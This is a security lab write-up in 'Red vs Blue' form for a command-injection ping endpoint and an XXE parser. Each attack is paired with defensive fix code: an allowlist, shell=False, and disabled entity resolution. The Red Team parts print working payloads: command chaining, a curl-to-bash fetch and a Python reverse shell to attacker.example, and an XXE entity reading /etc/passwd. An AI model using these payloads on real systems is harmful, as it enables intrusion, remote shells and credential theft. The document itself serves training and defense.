## Red vs Blue — Scenario C: Command Injection (Lab ID 4)

### Red Team — Attack

**Endpoint:** `POST /api/challenges/ping`

**Payloads (escalating severity):**

```json
{ "host": "8.8.8.8; id" }
```

```json
{ "host": "8.8.8.8 && cat /etc/passwd" }
```

```json
{ "host": "8.8.8.8; curl http://attacker.example/shell.sh | bash" }
```

```json
{ "host": "8.8.8.8; python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"attacker.example\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\"])'"}
```

**What happens:** With `shell=True` and string interpolation, the semicolons and shell operators are interpreted by bash. Any command after them executes with the web server's permissions. The reverse-shell payload gives the attacker an interactive shell on the host.

---

### Blue Team — Defense (submit this as fix code)

```python
import subprocess
from flask import Flask, request, jsonify

app = Flask(__name__)

# Strict allowlist — only known-safe hosts can be pinged.
ALLOWED_HOSTS = ["127.0.0.1", "localhost", "8.8.8.8"]

@app.route('/ping', methods=['POST'])
def ping():
    data = request.get_json() or {}
    host = data.get("host", "").strip()

    if not host:
        return jsonify({"output": "Missing 'host'", "error": True}), 400

    # FIXED Part 1: Allowlist — reject before any OS call is made.
    if host not in ALLOWED_HOSTS:
        return jsonify({
            "error": "Host not allowed",
            "output": f"Permitted hosts: {ALLOWED_HOSTS}"
        }), 403

    try:
        # FIXED Part 2: List form + shell=False — OS executes ping directly.
        # Semicolons and shell operators inside `host` are passed as a literal
        # argument to ping, not interpreted by any shell.
        result = subprocess.run(
            ["ping", "-c", "1", host],
            shell=False,
            capture_output=True,
            text=True,
            timeout=5
        )
        output = (result.stdout or "") + (result.stderr or "")
        return jsonify({"output": output})
    except subprocess.TimeoutExpired:
        return jsonify({"output": "Timeout", "error": True}), 400
    except Exception as e:
        return jsonify({"output": str(e), "error": True}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
```

---

## Red vs Blue — Scenario D: XXE (Lab ID 9) *(already working)*

### Red Team — Attack

**Endpoint:** `POST /api/challenges/xxe/parse`

```xml
<?xml version="1.0"?>
<!DOCTYPE exfil [
  <!ENTITY secret SYSTEM "file:///etc/passwd">
]>
<data><content>&secret;</content></data>
```

**Impact:** The vulnerable `lxml` parser resolves the `file://` entity and inlines `/etc/passwd` into the JSON response. Real targets include `/etc/shadow`, `~/.ssh/id_rsa`, application config files, and internal HTTP endpoints (SSRF).

---

### Blue Team — Defense

*(Full fix code is in Lab 9 — Defense above. Paste that code into the Submit Fix editor for game fix submission.)*

**Key changes:**
- `resolve_entities=False` — entities are never expanded
- `no_network=True` — no HTTP/FTP entity fetching
- `load_dtd=False` — DOCTYPE declarations are ignored entirely
- `huge_tree=False` — prevents XML bomb (Billion Laughs) DoS
